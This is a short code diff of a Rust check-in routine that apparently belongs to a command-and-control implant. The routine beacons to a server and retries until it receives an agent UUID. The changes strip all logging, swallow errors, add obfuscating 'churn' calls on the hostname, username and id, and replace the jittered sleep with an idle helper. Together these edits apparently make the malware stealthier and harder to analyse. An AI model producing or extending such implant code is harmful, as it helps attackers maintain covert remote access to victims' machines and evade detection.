@@ -221,22 +221,21 @@ pub fn checkin() {
 
     let json_str = serde_json::to_string(&checkin_data).unwrap();
 
-    // Retry checkin until UUID is updated — response parsing must succeed
+    crate::helpers::churn(hostname.as_str());
+    crate::helpers::churn(username.as_str());
+
     loop {
         match transport::send_request_with_response(&json_str) {
             Ok(resp) => {
                 if let Some(id) = resp.get("id").and_then(|v| v.as_str()) {
+                    crate::helpers::churn(id);
                     let mut uuid = config::UUID.write().unwrap();
                     *uuid = id.to_string();
-                    println!("[CHECKIN] Success, new UUID: {}", id);
                     return;
                 }
-                eprintln!("[CHECKIN] Response missing 'id' field: {:?}", resp);
             }
-            Err(e) => {
-                eprintln!("[CHECKIN] Error: {}", e);
-            }
+            Err(_) => {}
         }
-        crate::helpers::sleep_with_jitter();
+        crate::helpers::idle();
     }
 }
